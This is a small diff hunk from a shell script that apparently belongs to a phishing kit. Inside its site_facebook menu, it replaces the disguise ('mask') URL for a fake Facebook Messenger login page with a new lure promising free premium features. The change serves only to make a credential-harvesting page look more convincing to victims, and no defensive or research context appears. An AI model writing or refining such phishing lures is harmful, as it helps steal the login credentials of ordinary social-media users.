@@ -493,7 +493,7 @@ site_facebook() {
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='http://ludo-club-game-play-login-with-fb-to play'
+			mask='http://get-ludo-club-sign-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
